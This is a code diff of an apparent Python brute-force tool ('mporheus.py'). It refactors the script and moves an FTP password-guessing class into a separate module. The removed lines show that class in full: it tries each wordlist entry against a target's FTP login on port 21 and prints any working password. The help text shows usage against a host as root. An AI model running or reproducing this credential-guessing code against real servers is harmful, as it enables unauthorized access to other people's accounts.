@@ -5,7 +5,8 @@ import sys
 import argparse
 
 from multiprocessing import Process
-from sys import exit
+from sys import exit, platform
+from protocols.ftp import BruteFTB
 
 def banner():
     banner = '''
@@ -37,8 +38,25 @@ def banner():
 
     print(banner)
 
+def error(msg):
+    print(msg)
+    sys.exit(1)
 
-help_message = '''
+def verifySystem():
+    if (platform.startswith('win32')):
+        error("I'm sorry, use linux or mac osx")
+
+def isAlive(host, protocol):
+    service_port = socket.getservbyname(protocol)
+    alive = socket.socket()
+    alive.settimeout(1)
+    status = alive.connect_ex((host, service_port))
+
+    return status
+
+def main():
+
+    help_message = '''
     Arguments:
         --host,     -h      target
         --user,     -u      user, default is root
@@ -52,60 +70,7 @@ help_message = '''
     Example:
         python mporheus.py -h 192.168.1.1 -u root -w wordlist.txt -p ftp
 
-'''
-
-class BruteSSH(object):
-    pass
-
-
-class BruteFTB(object):
-    def __init__(self, host, user, wordlist):
-        self.user = user
-        self.host = host
-        self.wordlist = wordlist
-    
-    def Checkout(self):
-        
-        with open(self.wordlist, "r") as wordlist:
-            read = wordlist.readlines()
-        
-            for line in read:
-                sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sc.connect_ex((self.host, 21))
-                sc.recv(1024)
-
-                sc.send("USER {0}\r\n".format(self.user).encode())
-                sc.recv(1024)
-                sc.send("PASS {0}\r\n".format(line.strip()).encode())
-                
-                r = sc.recv(1024)
-                sc.send("QUIT\r\n".encode())
-
-                if u"230 Login successful" in str(r):
-                    print("\n\n")
-                    print("----------Successful----------")
-                    print("Target: {0}".format(self.host))
-                    print("Username: {0}".format(self.user))
-                    print("Password: {0}".format(line.strip()))
-                    print("------------------------------")
-                    exit(0)
-                else:            
-                    print("User: {0} - Password: {1} - failed".format(self.user, line.strip()))
-
-
-def error(msg):
-    print(msg)
-    sys.exit(1)
-
-def isAlive(host, protocol):
-    service_port = socket.getservbyname(protocol)
-    alive = socket.socket()
-    alive.settimeout(1)
-    status = alive.connect_ex((host, service_port))
-
-    return status
-
-def main():
+    '''
 
     parser = argparse.ArgumentParser(add_help=False, usage=help_message)
     parser.add_argument('--host', '-h',     action="store", dest="host",\
@@ -139,4 +104,5 @@ def main():
 
 if __name__=='__main__':
     banner()
+    verifySystem()
     main()
